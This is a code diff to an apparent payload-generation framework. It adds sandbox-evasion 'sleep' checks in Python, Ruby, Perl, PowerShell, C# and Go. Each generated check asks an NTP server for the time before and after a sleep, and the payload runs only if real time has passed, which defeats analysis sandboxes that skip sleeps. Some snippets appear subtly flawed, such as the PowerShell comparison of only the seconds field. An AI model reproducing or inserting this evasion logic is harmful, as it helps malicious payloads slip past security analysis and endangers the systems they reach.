@@ -76,6 +76,29 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+
+            rand_time_name = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'from time import sleep\n'
+            check_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
+            check_code += '\t' * num_tabs_required + 'import sys\n'
+            check_code += '\t' * num_tabs_required + 'import datetime\n'
+            check_code += '\t' * num_tabs_required + 'import time\n'
+            check_code += '\t' * num_tabs_required + 'import socket\n'
+            check_code += '\t' * num_tabs_required + 'import struct\n'
+            check_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
+            check_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
+            check_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
+            check_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
+            check_code += '\t' * num_tabs_required + 'sleep(' + evasion_payload.required_options["SLEEP"][0] + ')\n'
+            check_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
+            check_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
+            check_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + evasion_payload.required_options["SLEEP"][0] + '):\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         # Return check information
         return check_code, num_tabs_required
 
@@ -115,6 +138,19 @@ def senecas_games(evasion_payload):
 
             check_code += 'name = ENV["USERNAME"].downcase\n'
             check_code += 'if name[\"' + evasion_payload.required_options["USERNAME"][0].lower() + '\"]\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+
+            check_code += 'require \'socket\'\n'
+            check_code += 'ntp_msg = (["00011011"] + Array.new(47,1)).pack("B8 C47")\n'
+            check_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960);sock.close\n'
+            check_code += 'firstTime = Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800)\n'
+            check_code += 'sleep(' + evasion_payload.required_options["SLEEP"][0] + ')\n'
+            check_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960)\n'
+            check_code += 'if (Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800) - firstTime >= ' + evasion_payload.required_options["SLEEP"][0] + ')\n'
 
             # Add a tab for this check
             num_tabs_required += 1
@@ -161,6 +197,21 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+
+            check_code += '\t' * num_tabs_required + 'use IO::Socket;'
+            check_code += '\t' * num_tabs_required + 'my $firstTime;my $secondTime;my $sock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
+            check_code += '\t' * num_tabs_required + 'my $NTPTransmit = pack("B384", "00100011", (0)x14);my $secondTransmit = pack("B384", "00100011", (0)x14);\n'
+            check_code += '\t' * num_tabs_required + '$sock->send($NTPTransmit);$sock->recv($NTPTransmit, 384);my ($Ignore, $firstTime, $Ignore2)=unpack("B319 N B32",$NTPTransmit);$firstTime -= 2208988800;$sock->close;\n'
+            check_code += '\t' * num_tabs_required + 'sleep ' + evasion_payload.required_options["SLEEP"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
+            check_code += '\t' * num_tabs_required + '$newSock->send($secondTransmit);$newSock->recv($secondTransmit, 384);my ($Ignore, $secondTime, $Ignore2)=unpack("B319 N B32",$secondTransmit);$newSock->close;\n'
+            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
+            check_code += '\t' * num_tabs_required + 'if ((($secondTime - 2208988800) - $firstTime) >= ' + evasion_payload.required_options["SLEEP"][0] + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         # Return check information
         return check_code, num_tabs_required
 
@@ -179,6 +230,16 @@ def senecas_games(evasion_payload):
 
         if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":
             check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + evasion_payload.required_options["PROCESSORS"][0].lower() + ") {\n"
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+            check_code += "[Byte[]]$NTPTransmit=,1*48;$NTPTransmit[0]=0x1B;[Byte[]]$secondTransmit=,1*48;$secondTransmit[0]=0x1B;$noAccess=$false;"
+            check_code += "Try{$Socket=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$Socket.Connect('us.pool.ntp.org',123);[Void]$Socket.Send($NTPTransmit);[Void]$Socket.Receive($NTPTransmit)}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $NTPTransmit[40..43]){$runTotal=$runTotal*256+$Index};$firstTime=(New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second;"
+            check_code += "Start-Sleep -s " + evasion_payload.required_options["SLEEP"][0] + ";"
+            check_code += "Try{$NewSock=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$NewSock.Connect('us.pool.ntp.org',123);[Void]$NewSock.Send($secondTransmit);[Void]$NewSock.Receive($secondTransmit);$NewSock.Close()}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $secondTransmit[40..43]){$runTotal=$runTotal*256+$Index}\n"
+            check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + evasion_payload.required_options["SLEEP"][0] + " -or $noAccess) {\n"
             num_tabs_required += 1
 
         # Return check information
@@ -230,6 +291,22 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+            
+            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
+            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
+            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
+            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
+            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
+            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + evasion_payload.required_options["SLEEP"][0] + '*1000);\n'
+            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
+            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
+            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
+            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + evasion_payload.required_options["SLEEP"][0] + ' || skip) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         # Return check information
         return check_code, num_tabs_required
 
@@ -258,6 +335,19 @@ def senecas_games(evasion_payload):
         if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":
             check_code += rand_processor + " := runtime.NumCPU()\n"
             check_code += "if " + rand_processor + " >= " + evasion_payload.required_options["PROCESSORS"][0] + " {\n"
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
+            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
+            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
+            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
+            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
+            check_code += 'time.Sleep(time.Duration(' + evasion_payload.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
+            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
+            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
+            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
+            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + evasion_payload.required_options["SLEEP"][0] + ' {'
             num_tabs_required += 1
 
         # Return check information
